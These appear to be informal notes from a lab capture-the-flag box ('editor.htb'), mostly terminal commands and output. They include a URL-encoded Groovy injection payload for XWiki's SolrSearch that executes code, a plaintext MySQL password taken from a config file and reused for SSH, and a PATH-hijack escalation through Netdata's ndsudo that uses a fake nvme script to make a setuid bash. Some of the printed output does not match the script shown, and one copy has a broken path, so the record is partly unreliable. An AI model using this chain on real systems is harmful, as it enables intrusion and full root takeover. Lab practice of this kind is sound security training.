

```
kali@kali ~/h/editor> nmap -sC -sV 10.129.164.255
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 09:35 UTC
Nmap scan report for 10.129.164.255
Host is up (0.081s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
|_http-open-proxy: Proxy might be redirecting requests
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.164.255:8080/xwiki/bin/view/Main/
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
|_http-server-header: Jetty(10.0.20)
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   Server Type: Jetty(10.0.20)
|_  WebDAV type: Unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.91 seconds

```



```
http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28"Hello%20from"%20%2B%20"%20search%20text%3A"%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20
```



```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:37881         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:19999         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8125          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      1125/java           
tcp6       0      0 127.0.0.1:8079          :::*                    LISTEN      1125/java           
udp        0      0 127.0.0.1:8125          0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
```

every service is connected to another service whether it be mysql or ldap if its integrated etc. if its integrated then it must have the credentials in the file system in plaintext or in some variation or decryptable so that the service can connect to the other service, otherwise how would they connect automatically. In this case it would be xwiki would be connecting to mysql so we found  found SQL credentials 


looking for the mysql config file chatgpt tells us its here

```
cat /etc/xwiki/hibernate.cfg.xml
```



```
xwiki@editor:/usr/lib/xwiki/WEB-INF$ cat /etc/xwiki/hibernate.cfg.xml  | grep -ie jdbc.mysql -A 10
<wiki/hibernate.cfg.xml  | grep -ie jdbc.mysql -A 10
    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property>
    <property name="hibernate.dbcp.poolPreparedStatements">true</property>
    <property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>
```


```
mysql -h localhost -u xwiki -p'theEd1t0rTeam99' xwiki
```



APPARENTLY thsi is also olivers password!!!, always spray Ig

```
kali@kali ~/h/editor [255]> ssh oliver@10.129.164.255
The authenticity of host '10.129.164.255 (10.129.164.255)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.164.255' (ED25519) to the list of known hosts.
oliver@10.129.164.255's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Aug  4 10:44:58 AM UTC 2025

  System load:  0.07              Processes:             231
  Usage of /:   64.3% of 7.28GB   Users logged in:       0
  Memory usage: 52%               IPv4 address for eth0: 10.129.164.255
  Swap usage:   0%

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

4 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


Last login: Mon Aug 4 10:45:00 2025 from 10.10.14.162
oliver@editor:~$ 
```



```
oliver@editor:~$ find / -type f -name "ndsudo" 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```


```
oliver@editor:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```



places you can go to easier, that why its called path bro trust TM

path hijacking

```
oliver@editor:/proc$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -h

ndsudo

(C) Netdata Inc.

A helper to allow Netdata run privileged commands.

  --test
    print the generated command that will be run, without running it.

  --help
    print this message.

The following commands are supported:

- Command    : nvme-list
  Executables: nvme 
  Parameters : list --output-format=json

- Command    : nvme-smart-log
  Executables: nvme 
  Parameters : smart-log {{device}} --output-format=json

- Command    : megacli-disk-info
  Executables: megacli MegaCli 
  Parameters : -LDPDInfo -aAll -NoLog

- Command    : megacli-battery-info
  Executables: megacli MegaCli 
  Parameters : -AdpBbuCmd -aAll -NoLog

- Command    : arcconf-ld-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 LD

- Command    : arcconf-pd-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 PD

The program searches for executables in the system path.

Variables given as {{variable}} are expected on the command line as:
  --variable VALUE

VALUE can include space, A-Z, a-z, 0-9, _, -, /, and .
```


Command we need to name in the name of an executable


```
oliver@editor:/$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

oliver@editor:/$ mkdir -p /tmp/fakebin

oliver@editor:/$ chmod +x /tmp/fakebin/nvme

oliver@editor:/$ export PATH="/tmp/fakebin:$PATH"

oliver@editor:/$ echo $PATH
/tmp/fakebin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

oliver@editor:/$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

oliver@editor:/$ ls -la /tmp/fakebin
total 12
drwxrwxr-x 2 oliver oliver 4096 Aug  4 11:43 .
drwxrwxrwt 9 root   root   4096 Aug  4 11:44 ..
-rwxrwxr-x 1 oliver oliver   55 Aug  4 11:43 nvme

oliver@editor:/$ cd /tmp/fakebin

oliver@editor:/tmp/fakebin$ ls
nvme

oliver@editor:/tmp/fakebin$ ls -la
total 12
drwxrwxr-x 2 oliver oliver 4096 Aug  4 11:43 .
drwxrwxrwt 9 root   root   4096 Aug  4 11:44 ..
-rwxrwxr-x 1 oliver oliver   55 Aug  4 11:43 nvme

oliver@editor:/tmp/fakebin$ cd ..

oliver@editor:/tmp$ cat << 'EOF' > /tmp/fakebin/nvme
#!/bin/bash -p
echo "[*] Running payload..."
cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash
ls -l /tmp/rootbash
EOF

oliver@editor:/tmp$ chmod +x /tmp/fakebin/nvme
oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
[*] Running fake nvme payload...
-rwsr-xr-x 1 oliver oliver 1396520 Aug  4 11:45 /tmp/bash
[*] Done.
```



```
cat << 'EOF' > /tmp/fakebin/nvme
#!/bin/bash -p  <---- this is important
echo "[*] Running payload..."
cp /n/bash /tmp/rootbash
chmod u+s /tmp/rootbash
ls -l /tmp/rootbash
EOF
```




explanation for root here. 

